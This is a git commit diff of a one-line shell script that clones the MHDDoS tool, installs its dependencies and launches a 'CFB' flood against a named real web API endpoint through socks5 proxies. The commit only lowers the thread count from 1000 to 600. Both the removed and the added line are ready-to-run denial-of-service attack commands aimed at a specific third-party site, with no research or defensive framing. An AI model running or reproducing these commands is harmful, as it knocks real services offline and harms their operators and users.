0ad35eb675dc1363eb99c12ad466b750cbd26921
Nayuki Pro <91455547+Nayuki-Pro@users.noreply.github.com>
2022-04-04 08:36:06 +0800

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,1 +1,1 @@
-rm -rf MHDDoS&&git clone https://github.com/Nayuki-Pro/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://2cm.gay/api/v1/client/subscribe'  1  1000 socks5.txt  600 600
+rm -rf MHDDoS&&git clone https://github.com/Nayuki-Pro/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://2cm.gay/api/v1/client/subscribe'  1  600 socks5.txt  600 600
